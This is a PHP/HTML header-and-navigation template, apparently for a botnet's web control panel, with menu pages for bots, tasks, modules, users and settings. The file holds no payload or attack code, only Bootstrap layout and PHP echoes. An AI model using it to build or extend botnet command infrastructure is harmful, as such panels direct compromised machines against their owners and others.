<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<link rel="shortcut icon" href="../../docs-assets/ico/favicon.png">

	<title><?=$TEMPLATE['site']?> - <?=$GLOBALS['bot_name']?> Webpanel</title>

	<link href="template/css/datepicker3.css" rel="stylesheet">
	<link href="template/css/bootstrap.css" rel="stylesheet">
	<link href="template/bootstrap-main.css" rel="stylesheet">
	<script src="template/js/jquery-1.10.2.min.js"></script>
	<script src="template/js/bootstrap.min.js"></script>
	<script src="template/js/bootstrap-datepicker.js"></script>
</head>
<body>

	<div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
	<div class="container">
	<div class="navbar-header">
	<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
	<span class="sr-only">Toggle navigation</span>
	<span class="icon-bar"></span>
	<span class="icon-bar"></span>
	<span class="icon-bar"></span>
	</button>
	<a class="navbar-brand" href="index.php"><?=$GLOBALS['bot_name']?></a>
	</div>
	<div class="collapse navbar-collapse">
	<ul class="nav navbar-nav">
	<li <?=((!isset($_GET['p']) || $_GET['p'] == 'stats') ? 'class="active"' : '')?>><a href="index.php?p=stats">Stats</a></li>
	<li <?=((isset($_GET['p']) && $_GET['p'] == 'bots') ? 'class="active"' : '')?>><a href="index.php?p=bots">Bots</a></li>
	<li <?=((isset($_GET['p']) && $_GET['p'] == 'tasks') ? 'class="active"' : '')?>><a href="index.php?p=tasks">Tasks</a></li>
	<li class="dropdown">
        <a href="#" class="dropdown-toggle" data-toggle="dropdown">Modules <b class="caret"></b></a>
        <ul class="dropdown-menu">
<?php
foreach (scandir('modules') as $dir)
{
	if ($dir != '.' && $dir != '..')
		echo '<li><a href="?p=module&m='.$dir.'">'.$dir.'</a></li>';
}
?>
        </ul>
      </li>
	<li <?=((isset($_GET['p']) && $_GET['p'] == 'settings') ? 'class="active"' : '')?>><a href="index.php?p=settings">Settings</a></li>
	<li <?=((isset($_GET['p']) && $_GET['p'] == 'users') ? 'class="active"' : '')?>><a href="index.php?p=users">Users</a></li>
	<li <?=((isset($_GET['p']) && $_GET['p'] == 'debug') ? 'class="active"' : '')?>><a href="index.php?p=debug">Debug</a></li>
	<li <?=((isset($_GET['p']) && $_GET['p'] == 'logout') ? 'class="active"' : '')?>><a href="index.php?p=logout">Logout</a></li>
	</ul>
	</div><!--/.nav-collapse -->
	</div>
	</div>

	<div class="container">

	<div class="starter-template">
		<?=$TEMPLATE['text']?>
	</div>

	</div><!-- /.container -->

	<?=$TEMPLATE['js']?>
</body>
</html>
